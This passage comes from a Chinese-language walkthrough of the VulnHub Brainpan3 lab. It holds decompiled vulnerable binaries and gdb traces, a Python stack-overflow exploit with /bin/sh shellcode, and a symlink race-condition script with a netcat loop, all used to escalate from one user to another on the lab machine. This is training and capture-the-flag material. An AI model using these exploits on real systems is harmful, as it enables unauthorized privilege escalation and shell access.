<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl sub_80485ED(char *src, char *nptr)</span><br><span class="line">&#123;</span><br><span class="line">  char *v2; // eax</span><br><span class="line">  int v3; // ebx</span><br><span class="line">  int v4; // eax</span><br><span class="line">  char s[100]; // [esp+Ch] [ebp-78h]</span><br><span class="line">  int v7; // [esp+70h] [ebp-14h]</span><br><span class="line">  FILE *stream; // [esp+74h] [ebp-10h]</span><br><span class="line">  FILE *v9; // [esp+78h] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  memset(dest, 0, 0x64u);</span><br><span class="line">  memset(s, 0, 0x64u);</span><br><span class="line">  <span class="keyword">if</span> ( strlen(src) &lt;= 0x74 )</span><br><span class="line">    strcpy(s, src);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    strncpy(s, src, 0x5Au);</span><br><span class="line">  v2 = &amp;s[strlen(s)];</span><br><span class="line">  *(_DWORD *)v2 = 1668179246;</span><br><span class="line">  v2[4] = 0;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] saving to %s\n&quot;</span>, s);</span><br><span class="line">  strcpy(dest, nptr);</span><br><span class="line">  v9 = fopen(src, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( stream = fopen(s, <span class="string">&quot;w&quot;</span>); ; fputc(v4 ^ v3, stream) )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = fgetc(v9);</span><br><span class="line">      <span class="keyword">if</span> ( v7 == -1 )</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">      v3 = (char)v7;</span><br><span class="line">      v4 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    fclose(v9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从main函数开始，可以看到它将2个参数filename和key传递给cryptFile函数。在此函数中，它将对给定的文件名进行奇怪的长度检查，如果长度小于或等于116个字符，则会将完整文件名复制到100字节的pOutFilename缓冲区中，从而导致16字节的溢出。现在这还不足以溢出该函数的返回地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stack layout</span><br><span class="line">-00000078 pOutFile        db 100 dup(?)</span><br><span class="line">-00000014 DataByte        dd ?</span><br><span class="line">-00000010 fsin            dd ?                    ; offset</span><br><span class="line">-0000000C fsout           dd ?                    ; offset</span><br><span class="line">-00000008                 db ? ; undefined</span><br><span class="line">-00000007                 db ? ; undefined</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004                 db ? ; undefined</span><br><span class="line">-00000003                 db ? ; undefined</span><br><span class="line">-00000002                 db ? ; undefined</span><br><span class="line">-00000001                 db ? ; undefined</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008 pFile           dd ?                    ; offset</span><br><span class="line">+0000000C pKey            dd ?                    ; offset</span><br></pre></td></tr></table></figure>

<p>但是，从cryptFile返回并离开main函数时，会发生有趣的事情。由于主要功能以leave指令退出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.text:08048786                 call    sub_80485ED</span><br><span class="line">.text:0804878B                 mov     eax, 0</span><br><span class="line">.text:08048790</span><br><span class="line">.text:08048790 locret_8048790:                         ; CODE XREF: main+26↑j</span><br><span class="line">.text:08048790                 leave</span><br><span class="line">.text:08048791                 retn</span><br></pre></td></tr></table></figure>

<p>leave说明与以下内容相同：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>

<p>它有效地还原了堆栈指针，现在，在leave指令上放置一个断点并以116个字符的文件名启动可执行文件时，我们可以看到发生了什么</p>
<p>(gdb中调试的效果)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ECX: 0xb7fba3c0 --&gt; 0x0 </span><br><span class="line">EDX: 0xfffff000 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line">EBP: 0xbffff400 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">ESP: 0xbffff480 --&gt; 0xbffff69c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">EIP: 0x8048790 (leave)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048783:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x8048786:    call   0x80485ed</span><br><span class="line">   0x804878b:    mov    eax,0x0</span><br><span class="line">=&gt; 0x8048790:    leave  </span><br><span class="line">   0x8048791:    ret    </span><br><span class="line">   0x8048792:    xchg   ax,ax</span><br><span class="line">   0x8048794:    xchg   ax,ax</span><br><span class="line">   0x8048796:    xchg   ax,ax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff480 --&gt; 0xbffff69c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0004| 0xbffff484 --&gt; 0xbffff711 --&gt; 0x53530041 (<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">0008| 0xbffff488 --&gt; 0xbffff508 --&gt; 0x0 </span><br><span class="line">0012| 0xbffff48c --&gt; 0xb7e6fe46 (:    mov    DWORD PTR [esp],eax)</span><br><span class="line">0016| 0xbffff490 --&gt; 0x3 </span><br><span class="line">0020| 0xbffff494 --&gt; 0xbffff534 --&gt; 0xbffff686 (<span class="string">&quot;/root/vulnhub/brainpan3/cryptor&quot;</span>)</span><br><span class="line">0024| 0xbffff498 --&gt; 0xbffff544 --&gt; 0xbffff713 (<span class="string">&quot;SSH_AGENT_PID=4019&quot;</span>)</span><br><span class="line">0028| 0xbffff49c --&gt; 0xb7fdd860 --&gt; 0xb7e59000 --&gt; 0x464c457f </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048790 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>EBP（0xbffff400）指向文件名缓冲区，并在执行成为ESP的离开指令时</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ECX: 0xb7fba3c0 --&gt; 0x0 </span><br><span class="line">EDX: 0xfffff000 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line">EBP: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ESP: 0xbffff404 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">EIP: 0x8048791 (ret)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048786:    call   0x80485ed</span><br><span class="line">   0x804878b:    mov    eax,0x0</span><br><span class="line">   0x8048790:    leave  </span><br><span class="line">=&gt; 0x8048791:    ret    </span><br><span class="line">   0x8048792:    xchg   ax,ax</span><br><span class="line">   0x8048794:    xchg   ax,ax</span><br><span class="line">   0x8048796:    xchg   ax,ax</span><br><span class="line">   0x8048798:    xchg   ax,ax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff404 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0004| 0xbffff408 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0008| 0xbffff40c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0012| 0xbffff410 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0016| 0xbffff414 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0020| 0xbffff418 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0024| 0xbffff41c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0028| 0xbffff420 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048791 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>最后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ECX: 0xb7fba3c0 --&gt; 0x0 </span><br><span class="line">EDX: 0xfffff000 </span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x636e652e (<span class="string">&#x27;.enc&#x27;</span>)</span><br><span class="line">EBP: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">ESP: 0xbffff408 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">EIP: 0x41414141 (<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41414141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff408 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0004| 0xbffff40c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0008| 0xbffff410 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0012| 0xbffff414 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0016| 0xbffff418 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0020| 0xbffff41c (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0024| 0xbffff420 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">0028| 0xbffff424 (<span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x41414141 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>那么该如何利用呢？请记住，密钥存储在全局缓冲区中，似乎cryptor是用可执行的堆栈和内存编译的，因此可以将Shellcode放在密钥缓冲区中，并在文件名缓冲区溢出中使用以返回该Shellcode来执行该Shellcode。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : disabled</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<ul>
<li>Exploit:</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import struct</span><br><span class="line"></span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&#x27;</span></span><br><span class="line">__bss_key = 0x0804a080</span><br><span class="line">argFile = 29 * p(__bss_key)</span><br><span class="line">argKey = shellcode</span><br><span class="line"><span class="built_in">print</span> argFile + <span class="string">&#x27; &#x27;</span> + argKey</span><br></pre></td></tr></table></figure>

<p>执行漏洞利用程序时，它并不总是生效，只需多执行几次，直到它生效为止</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># ./cryptor $(python cryptthis.py)</span></span><br><span class="line">[+] saving to �����������������������������.enc</span><br><span class="line">段错误</span><br><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># ./cryptor $(python cryptthis.py)</span></span><br><span class="line">[+] saving to �����������������������������.enc</span><br><span class="line">段错误</span><br><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># ./cryptor $(python cryptthis.py)</span></span><br><span class="line">[+] saving to �����������������������������.enc</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/root/vulnhub/brainpan3</span><br><span class="line"><span class="comment"># uname -a</span></span><br><span class="line">Linux kali 5.4.0-kali2-amd64 <span class="comment">#1 SMP Debian 5.4.8-1kali1 (2020-01-06) x86_64 GNU/Linux</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">bofh  cryptor  cryptthis.py  poc.py  report  report.py  shell  test.py</span><br></pre></td></tr></table></figure>

<p>放在brainpan3上面运行poc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/tmp$ <span class="built_in">echo</span> <span class="string">&quot;import struct</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def p(v):</span></span><br><span class="line"><span class="string">    return struct.pack(&#x27;&lt;L&#x27;, v)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode = &#x27;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&#x27;</span></span><br><span class="line"><span class="string">__bss_key = 0x0804a080</span></span><br><span class="line"><span class="string">argFile = 29 * p(__bss_key)</span></span><br><span class="line"><span class="string">argKey = shellcode</span></span><br><span class="line"><span class="string">print argFile + &#x27; &#x27; + argKeyecho &quot;</span>import struct</span><br><span class="line">&gt; </span><br><span class="line">&gt; def p(v):</span><br><span class="line">&gt;     <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line">&gt; </span><br><span class="line">&lt;\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80<span class="string">&#x27;   </span></span><br><span class="line"><span class="string">&gt; __bss_key = 0x0804a080</span></span><br><span class="line"><span class="string">&gt; argFile = 29 * p(__bss_key)</span></span><br><span class="line"><span class="string">&gt; argKey = shellcode</span></span><br><span class="line"><span class="string">&gt; &quot; &gt; cryptthis.py</span></span><br><span class="line"><span class="string">print argFile + &#x27;</span> <span class="string">&#x27; + argKey&quot; &gt; cryptthis.py</span></span><br><span class="line"><span class="string">anansi@brainpan3:/tmp$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">cryptthis.py  vjGSL5d  vtSHi56</span></span><br><span class="line"><span class="string">anansi@brainpan3:/tmp$ cat cryptthis.py</span></span><br><span class="line"><span class="string">cat cryptthis.py</span></span><br><span class="line"><span class="string">import struct</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def p(v):</span></span><br><span class="line"><span class="string">    return struct.pack(&#x27;</span>&lt;L<span class="string">&#x27;, v)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">shellcode = &#x27;</span>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80<span class="string">&#x27;</span></span><br><span class="line"><span class="string">__bss_key = 0x0804a080</span></span><br><span class="line"><span class="string">argFile = 29 * p(__bss_key)</span></span><br><span class="line"><span class="string">argKey = shellcode</span></span><br><span class="line"><span class="string">print argFile + &#x27;</span> <span class="string">&#x27; + argKey</span></span><br><span class="line"><span class="string">anansi@brainpan3:/tmp$ python cryptthis.py</span></span><br><span class="line"><span class="string">python cryptthis.py</span></span><br><span class="line"><span class="string">����������������������������� 1����</span></span><br><span class="line"><span class="string">                                   Qh//shh/bin��</span></span><br><span class="line"><span class="string">anansi@brainpan3:/tmp$ cd /home</span></span><br><span class="line"><span class="string">cd /home</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">anansi  puck  reynard</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home$ cd renard</span></span><br><span class="line"><span class="string">cd renard</span></span><br><span class="line"><span class="string">bash: cd: renard: No such file or directory</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home$ cd reynard</span></span><br><span class="line"><span class="string">cd reynard</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home/reynard$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">private</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home/reynard$ cd private</span></span><br><span class="line"><span class="string">cd private</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home/reynard/private$ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">cryptor  sekret.txt.enc</span></span><br><span class="line"><span class="string">anansi@brainpan3:/home/reynard/private$ ./cryptor $(python /tmp/cryptthis.py)</span></span><br><span class="line"><span class="string">./cryptor $(python /tmp/cryptthis.py)</span></span><br><span class="line"><span class="string">[+] saving to �����������������������������.enc</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">reynard</span></span><br></pre></td></tr></table></figure>

<p>现在得到了reynard用户的权限</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub204.jpg"></p>
<h3 id="Puck"><a href="#Puck" class="headerlink" title="Puck"></a>Puck</h3><p>我花了点时间弄清楚如何升级到puck用户的权限，当执行netstat时，注意到端口7075上有一个本地列出的服务，当连接到它时，出现以下文本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc 127.0.0.1 7075</span><br><span class="line">nc 127.0.0.1 7075</span><br><span class="line">Incorrect key</span><br></pre></td></tr></table></figure>

<p>经过更多搜索之后，在/usr/local/sbin文件夹中找到了与此服务相关的trixd可执行文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span>/sbin/</span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/sbin/</span><br><span class="line">$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 40K</span><br><span class="line">drwxr-xr-x  2 root root 4.0K May 26  2015 .</span><br><span class="line">drwxr-xr-x 10 root root 4.0K May 19  2015 ..</span><br><span class="line">-rwxr-xr-x  1 root root  17K May 26  2015 brainpan3</span><br><span class="line">-rwxr-xr-x  1 root root 7.5K May 20  2015 trixd</span><br><span class="line">-rwxr-xr-x  1 root root  343 May 21  2015 www</span><br></pre></td></tr></table></figure>

<p>将文件复制到本地计算机以进行分析</p>
<p>main</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  int v1; // eax</span><br><span class="line">  int v2; // ebx</span><br><span class="line">  int v4; // ST1C_4</span><br><span class="line">  int v5; // ST1C_4</span><br><span class="line">  struct timeval timeout; // [esp+24h] [ebp-94h]</span><br><span class="line">  struct <span class="built_in">stat</span> stat_buf; // [esp+2Ch] [ebp-8Ch]</span><br><span class="line">  int buf; // [esp+84h] [ebp-34h]</span><br><span class="line">  int v9; // [esp+88h] [ebp-30h]</span><br><span class="line">  int v10; // [esp+8Ch] [ebp-2Ch]</span><br><span class="line">  int v11; // [esp+90h] [ebp-28h]</span><br><span class="line">  int v12; // [esp+94h] [ebp-24h]</span><br><span class="line">  int s1; // [esp+98h] [ebp-20h]</span><br><span class="line">  int v14; // [esp+9Ch] [ebp-1Ch]</span><br><span class="line">  int v15; // [esp+A0h] [ebp-18h]</span><br><span class="line">  int v16; // [esp+A4h] [ebp-14h]</span><br><span class="line">  int v17; // [esp+A8h] [ebp-10h]</span><br><span class="line">  unsigned int v18; // [esp+ACh] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v18 = __readgsdword(0x14u);</span><br><span class="line">  <span class="keyword">if</span> ( ptrace(0, 0, 1, 0) &lt; 0 )</span><br><span class="line">    <span class="built_in">return</span> -1;</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  timeout.tv_usec = 1;</span><br><span class="line">  buf = 0;</span><br><span class="line">  v9 = 0;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = 0;</span><br><span class="line">  v12 = 0;</span><br><span class="line">  s1 = 0;</span><br><span class="line">  v14 = 0;</span><br><span class="line">  v15 = 0;</span><br><span class="line">  v16 = 0;</span><br><span class="line">  v17 = 0;</span><br><span class="line">  __lxstat(3, <span class="string">&quot;/mnt/usb/key.txt&quot;</span>, &amp;stat_buf);</span><br><span class="line">  <span class="keyword">if</span> ( (stat_buf.st_mode &amp; 0xF000) == 40960 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = -1;</span><br><span class="line">    puts(<span class="string">&quot;Key file is compromised.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    select(1, 0, 0, 0, &amp;timeout);</span><br><span class="line">    v0 = open(<span class="string">&quot;/home/puck/key.txt&quot;</span>, 0);</span><br><span class="line">    <span class="keyword">if</span> ( v0 &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = v0;</span><br><span class="line">      perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">      v0 = v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">read</span>(v0, &amp;buf, 0x13u);</span><br><span class="line">    v1 = open(<span class="string">&quot;/mnt/usb/key.txt&quot;</span>, 0);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v1;</span><br><span class="line">      perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">      v1 = v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">read</span>(v1, &amp;s1, 0x13u);</span><br><span class="line">    v2 = strcmp((const char *)&amp;s1, (const char *)&amp;buf);</span><br><span class="line">    <span class="keyword">if</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = 0;</span><br><span class="line">      puts(<span class="string">&quot;Incorrect key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">&quot;Authentication successful&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Reynard可以写入“/mnt/usb/”文件夹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">131707    4 drwxrwx---   2 reynard  dev          4096 Aug  2 15:54 /mnt/usb</span><br></pre></td></tr></table></figure>

<p>一旦在7075上连接到服务，就会执行checkKeyfile函数，该函数打开2个密钥文件并比较它们的内容，如果它们匹配，则将其放入shell中。符号链接检查和睡眠（使用select）使Superkojiman暗示了比赛状况。可以在usb文件夹中重复创建一个密钥文件，然后将其更改为指向puck文件夹中的密钥文件的符号链接，同时连接到该服务，并希望在某个时候能克服符号链接检查和打开文件。将欺骗比较两个相同文件的代码，即pucks文件夹中的有效密钥。</p>
<h2 id="走向胜利"><a href="#走向胜利" class="headerlink" title="走向胜利"></a>走向胜利</h2><p>编写了一段python代码，该代码重复创建了一个密钥文件，将其更改为符号链接，并且每次操作之间几乎没有睡眠。该脚本必须作为reynard运行，因为他是唯一允许写入usb文件夹的脚本。任何其他用户都可以连接到该服务。</p>
<p>race.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> os.geteuid() != 1002:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Run as user reynard&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(1000)</span><br><span class="line">        os.system(<span class="string">&#x27;echo &quot;h4xh4xh4xh4xh4xh4x&quot; &gt; /mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        os.unlink(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">        os.symlink(<span class="string">&#x27;/home/puck/key.txt&#x27;</span>, <span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        os.unlink(<span class="string">&#x27;/mnt/usb/key.txt&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Finished&#x27;</span></span><br></pre></td></tr></table></figure>

<p>为了使其正常工作，需要2个shell，因此使用了报告漏洞利用创建了另一个anansi shell。当reynard shell执行race脚本时，此anansi shell用于连接到服务。race脚本。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python race.py</span><br><span class="line">python race.py</span><br></pre></td></tr></table></figure>

<p>在第二个终端中运行几次netcat循环，直到成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">anansi@brainpan3:/$ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..100&#125;;<span class="keyword">do</span> nc 127.0.0.1 7075;sleep 0.1; <span class="keyword">done</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;0..100&#125;;<span class="keyword">do</span> nc 127.0.0.1 7075;sleep 0.1; <span class="keyword">done</span></span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Incorrect key</span><br><span class="line">Key file is compromised.</span><br><span class="line">Authentication successful</span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1004(dev) groups=1001(puck)</span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">puck</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">anansi</span><br><span class="line">puck</span><br><span class="line">reynard</span><br><span class="line"><span class="built_in">cd</span> puck</span><br><span class="line"><span class="built_in">cd</span> puck</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">key.txt</span><br><span class="line">cat key.txt</span><br><span class="line">cat key.txt</span><br><span class="line">HBN48HY71ERG5GA6290V</span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">key.txt</span><br><span class="line">ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 24</span><br><span class="line">drwx------ 2 puck puck 4096 Jun 10  2015 .</span><br><span class="line">drwxr-xr-x 5 root root 4096 May 19  2015 ..</span><br><span class="line">-rw------- 1 puck puck    0 Jun 10  2015 .bash_history</span><br><span class="line">-rw-r--r-- 1 puck puck  220 May 19  2015 .bash_logout</span><br><span class="line">-rw-r--r-- 1 puck puck 3637 May 19  2015 .bashrc</span><br><span class="line">-rw-r--r-- 1 puck puck  675 May 19  2015 .profile</span><br><span class="line">-rw------- 1 puck puck   21 May 19  2015 key.txt</span><br></pre></td></tr></table></figure>

<h2 id="没有得到root权限，就没有荣耀"><a href="#没有得到root权限，就没有荣耀" class="headerlink" title="没有得到root权限，就没有荣耀"></a>没有得到root权限，就没有荣耀</h2><p>当搜索有关puck的文件时，已经找到了一个有趣的cron job</p>
